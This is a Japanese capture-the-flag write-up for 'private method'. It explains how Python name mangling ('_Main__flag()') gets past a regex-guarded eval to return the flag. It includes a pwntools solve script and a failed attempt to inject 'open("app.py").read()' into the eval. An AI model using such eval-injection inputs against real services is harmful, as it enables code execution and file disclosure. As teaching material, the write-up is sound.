---
title: "private method - AlpacaHack Daily"
category: "pwn"
subcategory: "pwn"
type: "writeup"
tags: ["pwn", "alpacahack", "pwntools", "eval", "regex", "private", "method"]
summary: "pwn writeup for \"private method\" from AlpacaHack Daily - techniques: alpacahack, pwntools, eval, regex, private, method."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d09_private_method/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "private method"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** private method
- **Date:** 2026-07-09
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d09_private_method>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d09_private_method/README.md>

---
# private method

## 問題

privateなメソッドは呼び出せないはず...

```py
import re

class Main:
    # public 
    def alpaca():
        return "🦙"

    # private
    def __flag():
        return "Alpaca{REDACTED}"

code = input(">>> Main.").strip()

if re.fullmatch(r"\w+\(\)", code):
    print(eval(f"Main.{code}"))
else:
    print("Nope")
```

## 概要

ソースコードを見ると、`alpaca`と`__flag`という2つのメソッドをもつ`Main`クラスが定義されています。

最初に入力を求められるので、`alpaca()`と入力すると、`print(Main.alpaca())`が実行され「🦙」が出力されます。

`__flag()`はプライベートメソッドとされているようですが、実行してフラグを得ることはできるのでしょうか？

※なお、真っ先に`alpaca()+open("app.py").read()`を試みましたが、正規表現チェックで弾かれてダメでした（笑）

## 解法

そもそもPythonにプライベートメソッドという概念はありません。

例えばJavaの場合、
```java
public class Hello {
    public static void main(String[] args) {
        printHello();
    }
    private static void printHello() {
        System.out.println("Hello, World!");
    }
}
```
のように頭に`private`を付けるとプライベートメソッドになり、外部から呼び出すことができなくなります。

Pythonの場合、頭に`_`を付けると「これは内部専用のメソッドだよ」という意思表示になる慣例がありますが、強制力はありません。

まず、`alpaca()`で試してみると、
```sh
$ nc localhost 1337
>>> Main.alpaca()
🦙
```
正しく呼び出されているようです。

しかし、`__flag()`を試してみると、
```sh
$ nc localhost 1337
>>> Main.__flag()
Traceback (most recent call last):
  File "//app.py", line 15, in <module>
    print(eval(f"Main.{code}"))
          ~~~~^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
AttributeError: type object 'Main' has no attribute '__flag'
```
「`Main`は`__flag`なんてもってないよ」というエラーになってしまいます。

そういえば、たしか頭に`__`をつけたときは変数名やメソッド名が何かの別名に置き換えられるんだったような気が……？

思い出せなかったのでWeb検索で調べてみると、
```
__メンバ名 → _クラス名__メンバ名
```
のように、頭に「_クラス名」が付けられるのでした。

このリネームは、継承の関係で衝突したりするのを防ぐためのものだそうです。

しかし、やはり呼び出すことを禁止する強制力はありません。

よって、今回の問題の場合は、
```
_Main__flag()
```
を入力すると、フラグを得ることができます。

```py
import pwn

HOST, PORT = "localhost", 1337
#HOST, PORT = "34.170.146.252", 35490

p = pwn.remote(HOST, PORT)
p.sendlineafter(b"Main.", b"_Main__flag()")
print(p.recvline())
```

## おまけ: WSLについて

Windows環境にはncコマンドがありません。

問題を解く上ではPythonのpwntools等を使えばいいのですが、今回の問題のようにncコマンドだけでサクッと解きたいときもあるでしょう。

私はWSL(Windows Subsystem for Linux)というのを使っています。

他にもCTFで使いがちなコマンドがいろいろ使えるようになるので、Linux環境はぜひ欲しいところです。

ここでは初心者の方向けにWSLでncコマンドを実行できるようになるまでの手順を簡潔に説明します。

まず、Powershellを管理者モードで開きます。（スタートメニューのWindows Powershellを右クリック→「管理者として実行」をクリック）

下記のコマンドを実行するとインストールされるので、終わったらPCを再起動してください。
```
wsl --install
```

インストールが上手くいっていたら、スタートメニューに「Ubuntu」ができているはずなので、これを起動します。

※初回のみユーザー名とパスワードの入力を求められるので入力します。

Ubuntuターミナルで下記の2つのコマンドを実行し、パッケージを最新にします。（パスワードをきかれたら、先ほどのパスワードを入力します。）
```
sudo apt update
sudo apt upgrade -y
```

つづけて、ncをインストールします。
```
sudo apt install netcat-openbsd -y
```

これで、
```
nc localhost 1337
```
や
```
nc 34.170.146.252 12345
```
などが使えるようになります。（本番環境のポート番号は問題ごとに提示されたものを使ってください。）

あと、参考ですが、下記のように接続してすぐinteractive()すれば、ncコマンドと同じような挙動を実現できます。

```py
import pwn

HOST, PORT = "localhost", 1337
p = pwn.remote(HOST, PORT)
p.interactive()
```
